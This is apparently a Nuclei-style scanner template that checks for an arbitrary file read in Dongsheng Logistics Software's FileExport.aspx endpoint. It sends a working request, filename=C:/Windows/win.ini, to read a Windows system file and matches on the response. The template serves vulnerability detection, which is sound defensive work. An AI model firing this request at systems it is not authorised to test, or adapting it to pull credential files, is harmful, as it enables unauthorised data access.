id: poc-yaml-dongshengsoft-fileexport-aspx-anyfile-read
info:
  name: Dongsheng Logistics Software FileExport.aspx Arbitrary File Read Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: file-read
  description: |
    Vulnerability in Dongsheng Logistics Software's FileExport.aspx endpoint allows for arbitrary file read by specifying the filename parameter.
http:
  - method: GET
    path:
      - "{{BaseURL}}/Reports/FileExport.aspx?filename=C:/Windows/win.ini"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "[files]"
          - "bit app support"
      - type: word
        part: header
        words:
          - "fileName=win.ini"
      - type: word
        part: header
        words:
          - "application/txt"
      - type: word
        part: body
        words:
          - "<"
        negative: true
